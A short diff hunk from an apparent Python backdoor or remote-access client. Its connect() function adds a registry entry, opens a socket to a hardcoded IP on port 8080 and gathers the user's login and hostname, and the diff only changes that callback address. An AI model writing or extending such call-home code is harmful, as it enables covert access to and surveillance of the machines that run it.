@@ -32,7 +32,7 @@ def check_admin():
 def connect():
     add_to_registry()
     client = socket.socket()
-    client.connect(("192.168.19.123", 8080))
+    client.connect(("192.168.19.140", 8080))
 
     user = os.getlogin()
     host = platform.node()
